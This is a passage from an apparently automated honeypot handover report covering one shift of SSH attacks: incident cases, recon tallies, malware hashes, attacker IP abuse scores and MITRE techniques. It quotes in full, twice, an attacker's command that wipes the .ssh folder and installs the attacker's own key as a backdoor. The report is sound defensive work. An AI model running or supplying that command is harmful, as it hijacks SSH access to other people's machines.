|---|---|
| **Source IP** | `102.216.240[.]71` |
| **First Seen** | 2026-05-01 06:12 |
| **Last Seen** | 2026-05-01 06:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 06:12:45` | `cowrie.session.connect` |
| `2026-05-01 06:12:45` | `cowrie.client.version` |
| `2026-05-01 06:12:45` | `cowrie.client.kex` |
| `2026-05-01 06:12:46` | `cowrie.login.success` |
| `2026-05-01 06:12:47` | `cowrie.session.params` |
| `2026-05-01 06:12:47` | `cowrie.command.input` |
| `2026-05-01 06:12:47` | `cowrie.command.failed` |
| `2026-05-01 06:12:48` | `cowrie.log.closed` |
| `2026-05-01 06:12:48` | `cowrie.session.params` |
| `2026-05-01 06:12:48` | `cowrie.command.input` |
| `2026-05-01 06:12:49` | `cowrie.session.file_download` |
| `2026-05-01 06:12:49` | `cowrie.log.closed` |
| `2026-05-01 06:12:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.216.240[.]71` to AbuseIPDB if not already reported
- [ ] Block `102.216.240[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e45dfc30e66

| Field | Detail |
|---|---|
| **Source IP** | `102.216.240[.]71` |
| **First Seen** | 2026-05-01 06:12 |
| **Last Seen** | 2026-05-01 06:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 06:12:52` | `cowrie.session.connect` |
| `2026-05-01 06:12:52` | `cowrie.client.version` |
| `2026-05-01 06:12:52` | `cowrie.client.kex` |
| `2026-05-01 06:12:54` | `cowrie.login.success` |
| `2026-05-01 06:12:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.216.240[.]71` to AbuseIPDB if not already reported
- [ ] Block `102.216.240[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be9bf51e2228

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]113` |
| **First Seen** | 2026-05-01 06:27 |
| **Last Seen** | 2026-05-01 06:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 06:27:48` | `cowrie.session.connect` |
| `2026-05-01 06:27:48` | `cowrie.client.version` |
| `2026-05-01 06:27:48` | `cowrie.client.kex` |
| `2026-05-01 06:27:49` | `cowrie.login.success` |
| `2026-05-01 06:27:49` | `cowrie.session.params` |
| `2026-05-01 06:27:49` | `cowrie.command.input` |
| `2026-05-01 06:27:49` | `cowrie.command.failed` |
| `2026-05-01 06:27:49` | `cowrie.log.closed` |
| `2026-05-01 06:27:50` | `cowrie.session.params` |
| `2026-05-01 06:27:50` | `cowrie.command.input` |
| `2026-05-01 06:27:50` | `cowrie.session.file_download` |
| `2026-05-01 06:27:50` | `cowrie.log.closed` |
| `2026-05-01 06:27:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]113` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfbbf26c6410

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]113` |
| **First Seen** | 2026-05-01 06:27 |
| **Last Seen** | 2026-05-01 06:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 06:27:53` | `cowrie.session.connect` |
| `2026-05-01 06:27:53` | `cowrie.client.version` |
| `2026-05-01 06:27:53` | `cowrie.client.kex` |
| `2026-05-01 06:27:54` | `cowrie.login.success` |
| `2026-05-01 06:27:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]113` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `143.255.141[.]221` | **30** | 2026-05-01 05:28 | 2026-05-01 06:07 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `185.16.214[.]226` | **30** | 2026-05-01 06:02 | 2026-05-01 06:22 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `209.99.190[.]113` | **30** | 2026-05-01 06:06 | 2026-05-01 06:32 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.216.240[.]71` | **19** | 2026-05-01 05:55 | 2026-05-01 06:38 | 0m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `67.86.91[.]215` | **19** | 2026-05-01 05:01 | 2026-05-01 05:11 | 26m | 0 | `T1592` | 🟠 MEDIUM |
| `14.103.117[.]173` | **7** | 2026-05-01 03:48 | 2026-05-01 04:06 | 14m | 0 | `T1592` | 🟢 LOW |
| `176.236.78[.]147` | **2** | 2026-05-01 05:17 | 2026-05-01 05:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | **2** | 2026-05-01 05:31 | 2026-05-01 05:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `1.13.22[.]203` | 1 | 2026-05-01 05:58 | 2026-05-01 06:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `105.188.112[.]133` | 1 | 2026-05-01 04:00 | 2026-05-01 04:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.245[.]82` | 1 | 2026-05-01 04:20 | 2026-05-01 04:21 | 60s | 1 | `T1110.001` | 🟢 LOW |
| `118.196.84[.]13` | 1 | 2026-05-01 03:58 | 2026-05-01 03:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `154.44.186[.]60` | 1 | 2026-05-01 04:02 | 2026-05-01 04:02 | 31s | 0 | `T1592` | 🟢 LOW |
| `3.131.220[.]121` | 1 | 2026-05-01 04:22 | 2026-05-01 04:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `99.228.247[.]37` | 1 | 2026-05-01 06:08 | 2026-05-01 06:08 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (25 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 40/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `154.44.186[.]60` | ES | UltaHost | **100** ⚠️ | 0 |
| `143.255.141[.]221` | PY | GIG@NET SOCIEDAD ANONIMA | **100** ⚠️ | 22 |
| `99.228.247[.]37` | CA | Rogers Cable Inc. HNSN | **100** ⚠️ | 2 |
| `185.16.214[.]226` | RU | Start2 LLC | **100** ⚠️ | 50 |
| `18.116.101[.]220` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `176.236.78[.]147` | TR | AKDENIZNET TELEKOMUNIKASYON LIMITED SIRKETI | **100** ⚠️ | 2 |
| `3.131.220[.]121` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `118.196.84[.]13` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 22 |
| `118.145.245[.]82` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 5 |
| `209.99.190[.]113` | CH | SKN Subnet & Telecom Ltd | **100** ⚠️ | 5 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 208 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 140 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 56 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 28 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 28 |

---

## 🔕 False Positive Summary (3352 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 45 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 269 |
| AbuseIPDB score 3 below threshold 25 | 3 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3029 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 3548 cases |
| Tool 34  | Credential Extractor        | ✅ 196 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 49 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3352 filtered (94.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 41 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 25 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 50 priority case(s) shown individually · 15 recon entry/entries in table (8 group(s) consolidating 139 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-01T06:40:36Z_
